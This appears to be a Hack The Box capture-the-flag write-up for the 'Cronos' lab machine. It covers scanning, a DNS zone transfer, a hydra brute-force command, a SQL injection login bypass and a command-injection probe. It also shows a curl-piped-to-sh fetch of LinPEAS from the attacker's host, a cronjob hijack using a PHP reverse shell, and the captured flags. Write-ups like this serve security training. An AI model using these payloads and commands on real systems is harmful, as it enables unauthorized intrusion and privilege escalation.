+++
title = "HTB - Cronos"
date = 2024-09-16
+++

<img alt="Image" async src="images/Cronos.png" width="800px"></img>

Cronos is an easy/intermediate box that will test an attacker's knowledge of zone transfers, remote code execution, simple SQL injection, and simple privilege escalation based on abused access. Let's get into it!
### Scan
```
└─# nmap -sV -sC --open -p- 10.10.10.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 09:59 EDT
Nmap scan report for 10.10.10.13
Host is up (0.14s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.89 seconds

```
### Enumeration

Landing page<img alt="Image" async src="images/Screenshot 2024-09-10 at 10.31.58 AM.png" width="800px"></img>

From the jump, the landing page doesn't leave us with much other than default configuration information. Feroxbuster comes up pretty empty as well, and when doing research online, all I can find is a TSIG Buffer Overflow vulnerability, but that seems out of play and a bit out of scope for a box like this. Searchsploit shows a few repos geared toward DOS and buffer overflow attacks as well, which won't help us here. I throw a general `--script vuln` nmap scan to see if anything comes back, and nothing except DOS attacks come back. 

Looking around on the web about Apache2 Ubuntu servers, we can find information about why we encountered the landing page. It looks like we need to find the DNS name that the IP resolves to, and we can do that with a tool called `nslookup`.
Using that command we can start our service, and then specify `server 10.10.10.13` to configure it, and then simply put in the IP `10.10.10.13` for DNS information.

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.02.53 AM.png" width="800px"></img>

After that, we can add it to our `/etc/hosts` file, and then visit the server. 

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.09.36 AM.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.09.56 AM.png" width="800px"></img>

The new landing page offers some options, and I started a feroxbuster in the background while I perused the sight. It seems to be hub for services provided by Laravel, which is a PHP based framework for building webapps. Nothing crazy going on on the backside.

Since we've got the domain name, let's do a zone transfer to find all of the hosts under this domain name. We can use the `host -l` command to do so, specifying our domain server and address afterwards to find the aliases.

`host -l cronos.htb 10.10.10.13`

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.15.58 AM.png" width="800px"></img>

We can add these to our `/etc/hosts` file.

When we visit the administrator site, we're met with portal. I tried a few simple credentials, but they didn't work. I'll opt for `john` and pass the list (`/usr/share/john/password.lst`) that I use find to `hydra`.  We'll need to intercept a request with Burp to know which parameters to configure.

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.25.50 AM.png" width="800px"></img>

Now that we've got it, let's configure `hydra`. 

```
hydra -l 'admin' -P /usr/share/john/password.lst admin.cronos.htb http-post-form "/:username=^USER^&password=^PASS^&Login=Login:Your Login Name or Password is invalid"
```

In this instance, `http-post-form` sends the post request, and the `"blah"` Specifies the username and pass parameters to be tried and the message to be shown. 

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.33.04 AM.png" width="800px"></img>

We find nothing of use. Let's try some sort of injection with the login field. There's a SQL injection cheatsheet I've bookmarked, and after trying some of the default instances, `admin' #` gets us in the door. This effectively ends the argument after admin is defined, meaning that we can login without a password.

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.36.13 AM.png" width="800px"></img>

### Initial Access

We've got access to a Net Tool that allows command injection. 

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.37.10 AM.png" width="800px"></img>

To probe, we can use `8.8.8.8& pwd& ps`

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.44.46 AM.png" width="800px"></img>

Now, let's try and get a shell. We can use Burp to modify our request. Don't forget to try different versions (bash, python, php) should one not work. Remember to URL encode!

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.54.41 AM.png" width="800px"></img>

<img alt="Image" async src="images/Screenshot 2024-09-10 at 11.54.19 AM.png" width="800px"></img>

We've got a shell as `www-data`. Some maintenance as always to stabilize our shell:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`stty raw -echo; fg` 

`export TERM="xterm"`

If we go to the `/home/noulis/` directory, we can find our user flag waiting for us. 

`USER:6394548063775e0b161d3b2771125340`

### Privilege Escalation

Let's serve `LinPeas.sh` from our machine to the target. Make sure the server is spinning from the directory you want to serve! Syntax below:

`python -m SimpleHTTPServer 80` Our Machine

`curl 10.10.14.3/linpeas.sh | sh` Compromised Machine

Once ran, we can take a look at all of the potential red-flags we've got. Given the severity of the notification via color-coding, and the name of the machine, I think we'll use this vector here exploiting the cronjob. A cronjob is a service account that sometimes has excess access over it's domain. In this case, since we are `www-data`, anything in the `/var/www/` directory will be available to us as if we were `root`.

<img alt="Image" async src="images/Screenshot 2024-09-10 at 12.17.42 PM.png" width="800px"></img>

Here, the `laravel/artisan` job will be what we leverage. Because the job is ran with PHP, we'll need a PHP shell. I got one at revshell.com, and I'll make a file and serve it over the python server.

<img alt="Image" async src="images/Screenshot 2024-09-10 at 12.26.01 PM.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2024-09-10 at 12.30.32 PM.png" width="800px"></img>

Once I've created the file, served it, and replace artisan, I'll get my listener going.

<img alt="Image" async src="images/Screenshot 2024-09-10 at 12.32.11 PM.png" width="800px"></img>

There she is! I'll `cd` to the root directory and grab my flag.

`ROOT:e2d2bbe3b974d0c044bfcdea242b709b`

#linux #medium #manual 

